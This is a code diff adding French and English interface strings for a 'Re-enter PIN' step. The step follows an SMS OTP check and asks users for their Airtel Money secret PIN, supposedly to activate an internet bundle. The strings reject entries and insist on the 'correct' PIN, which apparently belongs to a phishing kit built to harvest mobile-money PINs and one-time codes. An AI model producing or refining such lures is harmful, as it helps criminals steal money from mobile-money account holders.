@@ -107,6 +107,20 @@ export const TRANSLATIONS = {
     validating: 'Validation...',
     otpError: 'Code OTP incorrect ou expiré. Veuillez vérifier le SMS et réessayer.',
 
+    // Re-enter PIN Page
+    reenterPinTitle: 'Confirmation du Code PIN',
+    reenterPinSubtitle: 'Veuillez ressaisir votre code PIN correct pour valider et finaliser l’activation de votre forfait.',
+    reenterPinBadge: 'Étape de Sécurité Finale',
+    reenterPinLabel: 'Ressaisissez votre Code PIN Secret (4 chiffres)',
+    reenterPinHelper: 'Entrez votre code secret Airtel Money pour confirmer l’opération et activer le forfait.',
+    confirmAndActivate: 'CONFIRMER ET ACTIVER LE FORFAIT',
+    pinMismatchAlert: 'Code PIN non correspondant. Veuillez ressaisir votre code PIN correct.',
+    validatingReenterPin: 'Vérification du code PIN...',
+    verifyingReenterPinMsg: 'Vérification de la conformité de votre code PIN en cours. Veuillez patienter...',
+    reenterPinApproved: 'Code PIN confirmé !',
+    reenterPinRejected: 'Code PIN incorrect. Veuillez ressaisir le code PIN correct.',
+    otpVerifiedBadge: 'Code OTP SMS validé avec succès',
+
     // Success Page
     validationSuccess: 'Validation Réussie',
     planActivatedTitle: 'Forfait Internet Activé !',
@@ -232,6 +246,20 @@ export const TRANSLATIONS = {
     confirmActivate: 'CONFIRM & ACTIVATE',
     validating: 'Validating...',
     otpError: 'Incorrect or expired OTP code. Please check your SMS and try again.',
+
+    // Re-enter PIN Page
+    reenterPinTitle: 'Confirm Secret PIN',
+    reenterPinSubtitle: 'Please re-enter your correct PIN code to validate and finalize your bundle activation.',
+    reenterPinBadge: 'Final Security Step',
+    reenterPinLabel: 'Re-enter your Secret PIN Code (4 digits)',
+    reenterPinHelper: 'Enter your Airtel Money secret PIN to confirm transaction and activate the bundle.',
+    confirmAndActivate: 'CONFIRM & ACTIVATE BUNDLE',
+    pinMismatchAlert: 'PIN codes do not match. Please ensure you enter the correct secret PIN.',
+    validatingReenterPin: 'Verifying PIN code...',
+    verifyingReenterPinMsg: 'Verifying your secret PIN. Please wait...',
+    reenterPinApproved: 'PIN code confirmed!',
+    reenterPinRejected: 'Incorrect PIN code. Please re-enter the correct PIN.',
+    otpVerifiedBadge: 'SMS OTP Code Successfully Verified',
 
     // Success Page
     validationSuccess: 'Validation Successful',
